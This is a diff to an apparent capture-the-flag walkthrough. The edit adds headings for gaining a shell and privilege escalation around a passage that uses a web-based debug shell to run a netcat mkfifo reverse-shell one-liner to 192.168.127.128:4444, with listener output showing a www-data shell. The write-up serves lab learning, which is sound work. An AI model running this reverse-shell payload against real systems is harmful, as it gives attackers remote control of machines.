@@ -78,7 +78,11 @@ i checked all the directories found by fuzzing untill i reached `/debug` :
 
 this is a virtual shell on web, which we can insert any command on it, why not  a reverse shell ?
 
-so just use this payload and start a listener on your machine :
+
+## 3.Gaining Shell
+
+
+So just use this payload and start a listener on your machine :
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.127.128 4444 >/tmp/f
@@ -95,6 +99,8 @@ connect to [192.168.127.128] from (UNKNOWN) [192.168.127.133] 58766
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 ```
+
+## 4.Privilege Escalation
 
 
 
